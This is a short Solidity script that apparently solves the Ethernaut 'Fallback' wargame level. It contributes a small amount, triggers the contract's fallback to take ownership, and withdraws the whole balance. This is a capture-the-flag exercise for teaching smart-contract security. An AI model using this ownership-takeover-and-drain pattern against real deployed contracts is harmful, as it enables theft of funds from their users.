// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackScript is Attacker {
    Level private level = Level(0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        Fallback _fallback = Fallback(payable(instance));
        _fallback.contribute{value: 1 wei}();

        address(_fallback).call{value: 1 wei}("");
        _fallback.withdraw();
        require(_fallback.owner() == me.addr);
        require(address(_fallback).balance == 0);
        vm.stopBroadcast();
    }
}
